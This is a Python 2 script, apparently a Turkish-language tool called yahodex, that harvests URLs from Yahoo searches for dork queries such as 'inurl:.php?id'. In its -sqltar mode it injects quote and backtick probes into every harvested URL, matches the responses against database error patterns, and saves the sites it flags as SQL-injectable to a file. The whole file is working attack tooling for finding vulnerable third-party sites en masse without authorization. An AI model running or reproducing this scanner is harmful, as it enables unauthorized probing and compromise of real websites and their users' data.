# -*- coding: utf-8 -*-
import urllib
import ssl
import argparse
import sys
import os
import re
import requests
import time
import datetime
from bs4 import BeautifulSoup
reload(sys) 
sys.setdefaultencoding('utf-8')
os.system('cls' if os.name == 'nt' else 'clear')

class renkler:
    HEADER = '\033[95m'
    mavi = '\033[94m'
    yesil = '\033[92m'
    sari = '\033[93m'
    kirmizi = '\033[91m'
    beyaz = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
print renkler.yesil + """
#################################################################################
#                        Cüneyt TANRISEVER                                      #
#               Yahoo arama motoru / Dork tarayicisi                            #
# Kullanimi = parametreler -dork,-dorklistesi,-site,-sitelistesi,-sayfa,-sqltar #
# Bulunan urllerde sql taramasi yapmasi icin sonuna -sqltar ekleyiniz.          #
# yahodex.py -dork .php?id -sayfa 4                                             #
# yahodex.py -dorklistesi dorklar.txt -sayfa 5                                  #
# yahodex.py -site .com -dork .php?id -sayfa 10 -sqltar                         #
# yahodex.py -site .net -dorklistesi dorklar.txt -sayfa 2                       #
# yahodex.py -sitelistesi siteler.txt -dork .php?id -sayfa 4 -sqltar            #
# yahodex.py -sitelistesi siteler.txt -dorklistesi dorklar.txt -sayfa 6         #
#################################################################################"""+renkler.beyaz
print renkler.sari+"Baslama tarih ve zamani = " +time.strftime("%c")+renkler.beyaz
sayicik=0
def gecen(baslangic, bitis):
    sonuc = bitis - baslangic
    d= str(sonuc).split(":")
    dd= d[0]+":"+d[1]+":"+d[2][0:2]
    print renkler.sari+"Program islemi   %s' surede bitirmistir."%(dd)+renkler.beyaz
    
def dduz ():
    kaynak=[]
    karsilastirma=[]
    sonduzen=[]
    dex=open("yaho.txt","r").readlines()
    dex2=open("yaho.txt","w")
    dex2.close()
    for duzen in dex:
        dzr=duzen.replace("\n","")
        kaynak.append(dzr)
    for i in kaynak:
        karsilastirma.append(i)
    for i in karsilastirma:
        if sonduzen.count(i)==0:
            sonduzen.append(i)
    for i in sonduzen:
        if i.endswith("...")==False:
            yh=open("yaho.txt","a")
            yh.write(i+"\n")
            yh.close()
    kaynak=[]
    karsilastirma=[]
    sonduzen=[]
    karsilastirma=[]
    sonduzen=[]

parse= argparse.ArgumentParser()
parse.add_argument("-site", "--sitee", type=str)
parse.add_argument("-dork", "--doork", type=str)
parse.add_argument("-sqltara", "--sqltaraa", action= "store_true")
parse.add_argument("-dorklistesi", "--dorklistesii", type=str)
parse.add_argument("-sitelistesi", "--sitelistesii", type=str)
parse.add_argument("-sayfa", "--sayfalar",type=int, default= 1)
args= parse.parse_args()
site=args.sitee
sqltar=args.sqltaraa
dorktek=args.doork
dorklist=args.dorklistesii
sitelist=args.sitelistesii
sayfa=args.sayfalar
if site!=None and sitelist!=None:
    print renkler.kirmizi+"Bu iki parametre ayni anda kullanilamaz"+renkler.beyaz
if dorktek !=None and dorklist!= None:
    print renkler.kirmizi+"Bu iki parametre ayni anda kullanilamaz"+renkler.beyaz
if dorktek==None and dorklist ==None and site ==None and sitelist ==None:
    print renkler.kirmizi+"Parametresiz calismaz kullanim bilgilerini oku"+renkler.beyaz
if site!=None and sitelist==None and dorktek !=None and dorklist==None:
    if sayfa == 1:
        baslangic= datetime.datetime.now()
        print renkler.kirmizi+"1. sayfa okunuyor veriler aliniyor..."+renkler.beyaz
        bir="site:"+site+"+inurl:"+dorktek
        ur1=[]
        url = "https://search.yahoo.com/search;?p=%s&b=1&pz=10"%(bir)
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
        rq=requests.session()
        rq.headers.update(headers)
        res=rq.get(url)
        rm=res.content
        soup = BeautifulSoup(rm,'html.parser')
        dex= soup.find_all('h3')
        for i in dex:
            try:
                ka=str(i).split("/RU=")
                de= ka[1].split("/RK=")
                ur=de[0]
                ek= urllib.unquote(ur).decode('utf8')
                ur1.append(ek)
            except IndexError:
                pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
    if sayfa > 1:
        baslangic= datetime.datetime.now()
        bir="site:"+site+"+inurl:"+dorktek
        ur1=[]
        for ff in range(sayfa):
            sayila=ff+1
            print renkler.kirmizi+"%s ve %s dorku icin  %s. sayfa okunuyor veriler aliniyor..."%(site,dorktek,sayila)+renkler.beyaz
            say=ff*10+1
            url = "https://search.yahoo.com/search;?p=%s&b=%s&pz=10"%(bir,say)
            
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
            rq=requests.session()
            rq.headers.update(headers)
            res=rq.get(url)
            rm=res.content
            soup = BeautifulSoup(rm,'html.parser')
            dex= soup.find_all('h3')
       
            for i in dex:
                try:
                    ka=str(i).split("/RU=")
                    
                    de= ka[1].split("/RK=")
                    ur=de[0]
                    ek= urllib.unquote(ur).decode('utf8')
                    ur1.append(ek)
                except IndexError:
                    pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
####################################
if site!=None and sitelist==None and dorktek ==None and dorklist!=None:
    if sayfa == 1:
        baslangic= datetime.datetime.now()
        print renkler.kirmizi+"1. sayfa okunuyor veriler aliniyor..."+renkler.beyaz
        acs=open(dorklist,"r").readlines()
        ur1=[]
        for kj in acs:
            dorklar=kj.replace("\n","")
            bir="site:"+site+"+inurl:"+dorklar
            url = "https://search.yahoo.com/search;?p=%s&b=1&pz=10"%(bir)
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
            rq=requests.session()
            rq.headers.update(headers)
            res=rq.get(url)
            rm=res.content
        
            soup = BeautifulSoup(rm,'html.parser')
            dex= soup.find_all('h3')
       
            for i in dex:
                try:
                    ka=str(i).split("/RU=")
                
                    de= ka[1].split("/RK=")
                    ur=de[0]
                    ek= urllib.unquote(ur).decode('utf8')
                    ur1.append(ek)
                except IndexError:
                    pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
    if sayfa > 1:
        baslangic= datetime.datetime.now()
        acs=open(dorklist,"r").readlines()
        ur1=[]
        for kj in acs:
            dorklar=kj.replace("\n","")
            bir="site:"+site+"+inurl:"+dorklar
            
            for ff in range(sayfa):
                sayila=ff+1
                print renkler.kirmizi+"%s ve %s dorku icin  %s. sayfa okunuyor veriler aliniyor..."%(site,dorklar,sayila)+renkler.beyaz

                say=ff*10+1
                url = "https://search.yahoo.com/search;?p=%s&b=%s&pz=10"%(bir,say)
                
                headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
                rq=requests.session()
                rq.headers.update(headers)
                res=rq.get(url)
                rm=res.content
        
                soup = BeautifulSoup(rm,'html.parser')
                dex= soup.find_all('h3')
       
                for i in dex:
                    try:
                        ka=str(i).split("/RU=")
                
                        de= ka[1].split("/RK=")
                        ur=de[0]
                        ek= urllib.unquote(ur).decode('utf8')
                        ur1.append(ek)
                    except IndexError:
                        pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
######################################
if sitelist !=None and site ==None and dorktek!=None and dorklist==None:
    if sayfa == 1:
        baslangic= datetime.datetime.now()
        print renkler.kirmizi+"1. sayfa okunuyor veriler aliniyor..."+renkler.beyaz
        ac=open(sitelist,"r").readlines()
        ur1=[]
        for d in ac:
            sitel=d.replace("/n","")
            bir="site:"+sitel+"+inurl:"+dorktek
            
            
            url = "https://search.yahoo.com/search;?p=%s&b=1&pz=10"%(bir)
            
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
            rq=requests.session()
            rq.headers.update(headers)
            res=rq.get(url)
            rm=res.content
        
            soup = BeautifulSoup(rm,'html.parser')
            dex= soup.find_all('h3')
       
            for i in dex:
                try:
                    ka=str(i).split("/RU=")
                    
                    de= ka[1].split("/RK=")
                    ur=de[0]
                    ek= urllib.unquote(ur).decode('utf8')
                    ur1.append(ek)
                except IndexError:
                    pass
            yaho=open("yaho.txt","w")
            yaho.close()
            for i in ur1:
                yaho=open("yaho.txt","a")
                yaho.write(i+"\n")
                yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
    if sayfa > 1:
        baslangic= datetime.datetime.now()
        ac=open(sitelist,"r").readlines()
        ur1=[]
        for d in ac:
            sitel=d.replace("/n","")
            bir="site:"+sitel+"+inurl:"+dorktek
            
            for ff in range(sayfa):
                sayila=ff+1
                print renkler.kirmizi+"%s ve %s dorku icin  %s. sayfa okunuyor veriler aliniyor..."%(sitel,dorktek,sayila)+renkler.beyaz

                say=ff*10+1
                url = "https://search.yahoo.com/search;?p=%s&b=%s&pz=10"%(bir,say)
                
                headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
                rq=requests.session()
                rq.headers.update(headers)
                res=rq.get(url)
                rm=res.content
                soup = BeautifulSoup(rm,'html.parser')
                dex= soup.find_all('h3')
       
                for i in dex:
                    try:
                        ka=str(i).split("/RU=")
                        de= ka[1].split("/RK=")
                        ur=de[0]
                        ek= urllib.unquote(ur).decode('utf8')
                        ur1.append(ek)
                    except IndexError:
                        pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
   

if sitelist!=None and dorklist!=None and dorktek==None and site==None :
    if sayfa == 1:
        baslangic= datetime.datetime.now()
        print renkler.kirmizi+"1. sayfa okunuyor veriler aliniyor..."+renkler.beyaz
        ac=open(sitelist,"r").readlines()
        ac1=open(dorklist,"r").readlines()
        ur1=[]
        for d in ac:
            sitel=d.replace("/n","")
            for j in ac1:
                dorklar=j.replace("\n","")
                bir="site:"+sitel+"+inurl:"+dorklar
                
                for ff in range(sayfa):
                    
                    say=ff*10+1
                    url = "https://search.yahoo.com/search;?p=%s&b=%s&pz=10"%(bir,say)
                    
                    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
                    rq=requests.session()
                    rq.headers.update(headers)
                    res=rq.get(url)
                    rm=res.content
        
                    soup = BeautifulSoup(rm,'html.parser')
                    dex= soup.find_all('h3')
       
                    for i in dex:
                        try:
                            ka=str(i).split("/RU=")
                
                            de= ka[1].split("/RK=")
                            ur=de[0]
                            ek= urllib.unquote(ur).decode('utf8')
                            ur1.append(ek)
                        except IndexError:
                            pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
    if sayfa > 1:
        baslangic= datetime.datetime.now()
        ac=open(sitelist,"r").readlines()
        ac1=open(dorklist,"r").readlines()
        ur1=[]
        for d in ac:
            sitel=d.replace("/n","")
            for j in ac1:
                dorklar=j.replace("\n","")
                bir="site:"+sitel+"+inurl:"+dorklar
                
                for ff in range(sayfa):
                    sayila=ff+1
                    print renkler.kirmizi+" %s ve %s dorku icin %s. sayfa okunuyor veriler aliniyor..."%(sitel,dorklar,sayila)+renkler.beyaz

                    say=ff*10+1
                    url = "https://search.yahoo.com/search;?p=%s&b=%s&pz=10"%(bir,say)
                    
                    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
                    rq=requests.session()
                    rq.headers.update(headers)
                    res=rq.get(url)
                    rm=res.content
        
                    soup = BeautifulSoup(rm,'html.parser')
                    dex= soup.find_all('h3')
       
                    for i in dex:
                        try:
                            ka=str(i).split("/RU=")
                
                            de= ka[1].split("/RK=")
                            ur=de[0]
                            ek= urllib.unquote(ur).decode('utf8')
                            ur1.append(ek)
                        except IndexError:
                            pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()

if dorktek!=None and dorklist==None and site==None and sitelist==None:
    if sayfa == 1:
        baslangic= datetime.datetime.now()
        print renkler.kirmizi+"1. sayfa okunuyor veriler aliniyor..."+renkler.beyaz
        bir="inurl:"+dorktek
        
        ur1=[]
        url = "https://search.yahoo.com/search;?p=%s&b=1&pz=10"%(bir)
        
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
        rq=requests.session()
        rq.headers.update(headers)
        res=rq.get(url)
        rm=res.content
        
        soup = BeautifulSoup(rm,'html.parser')
        dex= soup.find_all('h3')
       
        for i in dex:
            try:
                ka=str(i).split("/RU=")
                
                de= ka[1].split("/RK=")
                ur=de[0]
                ek= urllib.unquote(ur).decode('utf8')
                ur1.append(ek)
            except IndexError:
                pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
    if sayfa > 1:
        baslangic= datetime.datetime.now()
        bir="inurl:"+dorktek
        
        ur1=[]
        for ff in range(sayfa):
            sayila=ff+1
            print renkler.kirmizi+"%s dorku icin %s. sayfa okunuyor veriler aliniyor..."%(dorktek,sayila)+renkler.beyaz

            say=ff*10+1
            url = "https://search.yahoo.com/search;?p=%s&b=%s&pz=10"%(bir,say)
            
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
            rq=requests.session()
            rq.headers.update(headers)
            res=rq.get(url)
            rm=res.content
            soup = BeautifulSoup(rm,'html.parser')
            dex= soup.find_all('h3')
       
            for i in dex:
                try:
                    ka=str(i).split("/RU=")
                    
                    de= ka[1].split("/RK=")
                    ur=de[0]
                    ek= urllib.unquote(ur).decode('utf8')
                    ur1.append(ek)
                except IndexError:
                    pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
    
    
if dorklist!=None and dorktek==None and site==None and sitelist==None:
    if sayfa == 1:
        baslangic= datetime.datetime.now()
        ac=open(dorklist,"r").readlines()
        ur1=[]
        print renkler.kirmizi+"1. sayfa okunuyor veriler aliniyor..."+renkler.beyaz
        for d in ac:
            sitel=d.replace("/n","")
            print renkler.kirmizi+"%s dorku icin sayfa okunuyor veriler aliniyor"%(sitel)+renkler.beyaz
            bir="inurl:"+sitel
            
            url = "https://search.yahoo.com/search;?p=%s&b=1&pz=10"%(bir)
            
            headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
            rq=requests.session()
            rq.headers.update(headers)
            res=rq.get(url)
            rm=res.content
            soup = BeautifulSoup(rm,'html.parser')
            dex= soup.find_all('h3')
            for i in dex:
                try:
                    ka=str(i).split("/RU=")
                    de= ka[1].split("/RK=")
                    ur=de[0]
                    ek= urllib.unquote(ur).decode('utf8')
                    ur1.append(ek)
                except IndexError:
                    pass
            yaho=open("yaho.txt","w")
            yaho.close()
            for i in ur1:
                yaho=open("yaho.txt","a")
                yaho.write(i+"\n")
                yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
    if sayfa > 1:
        baslangic= datetime.datetime.now()
        ac=open(dorklist,"r").readlines()
        ur1=[]
        for d in ac:
            sitel=d.replace("/n","")
            bir="inurl:"+sitel
            
            for ff in range(sayfa):
                sayila=ff+1
                print renkler.kirmizi+"%s dorku icin  %s. sayfa okunuyor veriler aliniyor..."%(sitel,sayila)+renkler.beyaz

                say=ff*10+1
                url = "https://search.yahoo.com/search;?p=%s&b=%s&pz=10"%(bir,say)
                
                headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
                rq=requests.session()
                rq.headers.update(headers)
                res=rq.get(url)
                rm=res.content
                soup = BeautifulSoup(rm,'html.parser')
                dex= soup.find_all('h3')
       
                for i in dex:
                    try:
                        ka=str(i).split("/RU=")
                    
                        de= ka[1].split("/RK=")
                        ur=de[0]
                        ek= urllib.unquote(ur).decode('utf8')
                        ur1.append(ek)
                    except IndexError:
                        pass
        yaho=open("yaho.txt","w")
        yaho.close()
        for i in ur1:
            yaho=open("yaho.txt","a")
            yaho.write(i+"\n")
            yaho.close()
        bitis= datetime.datetime.now()
        gecen(baslangic,bitis)
        dduz()
if sqltar!= False:
    baslangic= datetime.datetime.now()
    sayicik=0
    print renkler.mavi+"\nSql Taramasi Basladi..."+renkler.beyaz
    dosya=open("yahosqlaciklisiteler.txt","w")
    dosya.close()
    kaynak=[]
    karsilastirma=[]
    sonduzen=[]
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
    rq=requests.session()
    rq.headers.update(headers)
    db={
        "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
        "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
        "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
        "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
        "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
        "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
        "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
        "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
    }
    urlcek=open("yaho.txt","r").readlines()
    b=[]
    for uy in urlcek:
        urlc=uy.replace("\n","")
        sqlhata=("'","'Q","')","';",'"','")','";','`','`)','`;','\\',"%27","%%2727","%25%27","%60","%5C")
        sayicik+=1
        sys.stdout.write('\r')
        sys.stdout.write(str(sayicik)+'.siradaki url deneniyor...')
        sys.stdout.flush()
        for payd in sqlhata:
            try:
                pk=payd+"&"
                ur=urlc.replace("&",pk)
                url=ur+payd
                res=rq.get(url,timeout=10).content
                for db1,hatalar in db.items():
                    for hata in hatalar:
                        if re.compile(hata).search(res):
                            print renkler.yesil+"\nsql acikli site="+renkler.sari+db1+renkler.beyaz+" ",renkler.kirmizi+url+renkler.beyaz
                            dsyz=open("yahosqlaciklisiteler.txt","a")
                            dsyz.write(url+"\n")
                            dsyz.close()
                            b.append("1")
                            break
                        else:
                            pass
            except requests.exceptions.ConnectionError:
                print renkler.kirmizi+"\nboyle bir site yok veya ban yedin diye baglanmadi"+renkler.beyaz
                continue
            except requests.exceptions.Timeout:
                print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi."+renkler.beyaz
                continue
            except requests.exceptions.TooManyRedirects:
                print renkler.kirmizi+"\n20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
                continue
            except IOError:
                continue;
            if b !=[]:
                b=[]
                break
    dsyz=open("yahosqlaciklisiteler.txt","r").readlines()
    yhoy=open("yahosqlaciklisiteler.txt","w")
    yhoy.close()
    for ks in dsyz:
        df=ks.replace("\n","")
        kaynak.append(df)
    for i in kaynak:
        karsilastirma.append(i)
    for i in karsilastirma:
        if sonduzen.count(i)==0:
            sonduzen.append(i)
    for i in sonduzen:
        dsyz=open("yahosqlaciklisiteler.txt","a")
        dsyz.write(i+"\n")
        dsyz.close()
    kaynak=[]
    karsilastirma=[]
    sonduzen=[]
    bitis= datetime.datetime.now()
    print renkler.yesil+"\n------ Sonuclar yahosqlaciklisiteler.txt kayit edildi ------"+renkler.beyaz
    gecen(baslangic,bitis)
